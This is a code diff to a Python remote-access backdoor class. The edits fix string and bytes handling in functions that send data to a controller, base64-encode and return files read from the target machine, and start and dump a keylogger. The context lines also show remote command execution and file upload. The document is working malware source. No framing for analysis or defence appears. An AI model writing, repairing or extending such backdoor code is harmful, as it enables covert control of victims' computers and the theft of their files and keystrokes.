@@ -27,7 +27,9 @@ class Backdoor:
                 continue
 
     def send(self, data):
-        json_data = json.dumps(data.decode())
+        if isinstance(data, bytes):
+            data = data.decode()
+        json_data = json.dumps(data)
         self.conn.send(json_data.encode())
 
     def execute_remote_command(self, command):
@@ -47,9 +49,11 @@ class Backdoor:
     def download_file(self, path):
         try:
             with open(path, "rb") as file:
-                return base64.b64encode(file.read())
-        except Exception:
-            return b"[-] File not found!"
+                return base64.b64encode(file.read()).decode()
+        except FileNotFoundError:
+            return "[-] File not found!"
+        except Exception as e:
+            return f"[-] Error: {str(e)}"
 
     def upload_file(self, path, content):
         try:
@@ -113,7 +117,7 @@ class Backdoor:
                     content = path_content[2]
                     result = self.upload_file(path, content)
                 elif command[0] == "keyscan_start":
-                    result = b"[+] Keyscan started!"
+                    result = "[+] Keyscan started!"
                     t = threading.Thread(target=self.keyscan_start, daemon=True)
                     t.start()
                 elif command[0] == "keyscan_dump":
@@ -131,8 +135,9 @@ class Backdoor:
             except KeyboardInterrupt:
                 exit(0)
             except Exception as e:
-                self.send(f"[-] Error: {str(e)}".encode())
-
+                self.send(f"[-] Error: {str(e)}")
+            
+            
 def get_ip_address():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
